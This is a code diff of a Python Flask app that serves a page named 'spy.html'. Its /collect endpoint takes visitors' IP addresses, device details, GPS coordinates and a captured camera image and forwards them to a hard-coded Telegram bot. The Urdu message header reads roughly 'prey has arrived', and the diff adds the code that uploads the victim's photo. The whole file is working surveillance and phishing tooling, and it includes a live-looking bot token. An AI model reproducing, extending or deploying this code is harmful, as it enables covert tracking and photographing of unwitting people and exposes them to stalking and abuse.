@@ -1,50 +1,51 @@
 from flask import Flask, request, render_template
 import requests
 import os
+import base64
 
 app = Flask(__name__)
 
 # ====== Telegram Configuration ======
 BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
-CHAT_ID = "6908281054"  # ← اپنی چیٹ آئی ڈی یہاں لگائیں
+CHAT_ID = "6908281054"  # ← اپنا چیٹ آئی ڈی
 
 # ====== HTML Route ======
 @app.route('/')
 def index():
     return render_template("spy.html")
 
-# ====== Data Receiver ======
+# ====== Location + Info + Image Receiver ======
 @app.route('/collect', methods=['POST'])
 def collect():
-    try:
-        data = request.get_json()  # JSON body
-        ip = request.remote_addr
-        user_agent = request.headers.get('User-Agent')
+    data = request.json
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = data.get('userAgent')
+    latitude = data.get('latitude')
+    longitude = data.get('longitude')
+    image_data = data.get('image')  # Base64 image string
 
-        latitude = data.get("latitude", "❌")
-        longitude = data.get("longitude", "❌")
-
-        location_link = f"https://www.google.com/maps?q={latitude},{longitude}" if latitude != "❌" else "Location not shared"
-
-        message = f"""
+    message = f"""
 👁️ شکار آیا!
 🌐 IP Address: {ip}
 📱 Device Info: {user_agent}
-📍 Location: {location_link}
+📍 Location: https://www.google.com/maps?q={latitude},{longitude}
 🧠 Raw Data: {data}
-        """
+"""
 
-        # Telegram Message Send
-        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {'chat_id': CHAT_ID, 'text': message}
-        requests.post(telegram_url, data=payload)
+    # Send message to Telegram
+    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    requests.post(telegram_url, data={'chat_id': CHAT_ID, 'text': message})
 
-        return "Data received", 200
+    # Send image if exists
+    if image_data:
+        image_bytes = base64.b64decode(image_data.split(",")[1])
+        files = {'photo': ('capture.jpg', image_bytes)}
+        photo_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+        requests.post(photo_url, data={'chat_id': CHAT_ID}, files=files)
 
-    except Exception as e:
-        return f"Error: {e}", 500
+    return "OK", 200
 
-# ====== Run App ======
+# ====== Run on Render or Local ======
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
